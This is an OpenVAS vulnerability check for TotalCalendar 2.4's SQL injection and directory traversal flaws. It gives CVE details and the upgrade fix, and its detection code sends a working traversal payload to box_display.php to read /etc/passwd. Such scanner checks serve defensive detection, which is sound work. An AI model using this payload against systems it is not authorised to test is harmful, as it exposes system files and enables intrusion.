##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_totalcalendar_sql_inj_n_dir_trav_vuln.nasl 5401 2017-02-23 09:46:07Z teissa $
#
# TotalCalendar SQL Injection and Directory Traversal Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902225");
  script_version("$Revision: 5401 $");
  script_tag(name:"last_modification", value:"$Date: 2017-02-23 10:46:07 +0100 (Thu, 23 Feb 2017) $");
  script_tag(name:"creation_date", value:"2010-08-02 12:38:17 +0200 (Mon, 02 Aug 2010)");
  script_cve_id("CVE-2009-4973", "CVE-2009-4974");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("TotalCalendar SQL Injection and Directory Traversal Vulnerabilities");
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/9524");
  script_xref(name : "URL" , value : "http://en.securitylab.ru/nvd/396246.php");
  script_xref(name : "URL" , value : "http://en.securitylab.ru/nvd/396247.php");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "insight" , value : "The flaw exists due to:
  - An improper validation of user supplied data to 'selectedCal' parameter
  in a 'SwitchCal' action within the 'modfile.php' script.
  - An improper validation of user supplied data to 'box' parameter to script
 'box_display.php'.");
  script_tag(name : "solution" , value : "Upgrade to version 2.403 or later,
  For updates refer to http://www.sweetphp.com/nuke/index.php");
  script_tag(name : "summary" , value : "This host is running TotalCalendar and is prone to SQL injection
  and directory traversal vulnerabilities.");
  script_tag(name : "impact" , value : "Successful exploitation will allow remote attackers to execute
  arbitrary HTML and script code and manipulate SQL queries by injecting
  arbitrary SQL code in a user's browser session in context of an affected site.

  Impact Level: Application.");
  script_tag(name : "affected" , value : "TotalCalendar version 2.4");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP port
tcPort = get_http_port(default:80);

## Check the php support
if(!can_host_php(port:tcPort)){
  exit(0);
}

foreach dir (make_list_unique("/projects/TotalCalendar", "/TotalCalendar", "/", cgi_dirs(port:tcPort)))
{

  if(dir == "/") dir = "";

  ## Send and Receive the response
  rcvRes = http_get_cache(item: dir + "/index.php", port:tcPort);

  ## Confirm application installation
  if("Event calendar powered by TotalCalendar>" >< rcvRes)
  {
    ## Try expliot and check response
    sndReq = http_get(item:string(dir, "/box_display.php?box=../../../../../" +
                                       "../../../etc/passwd%00.htm"), port:tcPort);
    rcvRes = http_keepalive_send_recv(port:tcPort, data:sndReq);

    ## Check the Response string
    if("root:/root:/bin/bas" >< rcvRes)
    {
      security_message(port:tcPort);
      exit(0);
    }
  }
}

exit(99);